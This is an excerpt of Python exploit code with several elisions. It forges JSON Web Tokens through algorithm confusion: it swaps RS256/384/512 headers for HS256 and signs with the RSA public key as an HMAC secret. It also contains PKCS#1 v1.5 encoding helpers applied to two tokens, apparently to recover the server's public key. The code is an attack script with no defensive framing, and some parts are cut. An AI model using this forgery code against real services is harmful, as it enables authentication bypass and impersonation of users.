...
def forge_mac(jwt0, public_key):
    ...
    # Always use HS256
    alg_tampered = b64urlencode(
            alg.replace(b"RS256", b"HS256")
            .replace(b"RS384", b"HS256")
            .replace(b"RS512", b"HS256"))
    ...
    tamper_hmac = b64urlencode(
            hmac.HMAC(
                public_key, b'.'.join([alg_tampered, payload_encoded]),
                hashlib.sha256
                ).digest())

    jwt0_tampered = b'.'.join([alg_tampered, payload_encoded, tamper_hmac])
    print(f"[+] Tampered JWT: {jwt0_tampered}")
    return jwt0_tampered


def EMSA_PKCS1_V1_5_ENCODE(hash, emLen, with_hash_parameters=True):
    if with_hash_parameters:
        digestAlgo = DerSequence([DerObjectId(hash.oid).encode(), DerNull().encode()])
    else:
        digestAlgo = DerSequence([DerObjectId(hash.oid).encode(),])
    ...
    if emLen < len(digestInfo) + 11:
        raise TypeError(f"Selected hash algorith has a too long digest ({len(digest)} bytes).")
...
padded0 = EMSA_PKCS1_V1_5_ENCODE(hash_0, len(jwt0_sig_bytes))

jks1_input = ".".join(jwt1.split('.')[0:2])
hash_1 = HASH.new(jks1_input.encode('ascii'))
padded1 = EMSA_PKCS1_V1_5_ENCODE(hash_1, len(jwt0_sig_bytes))
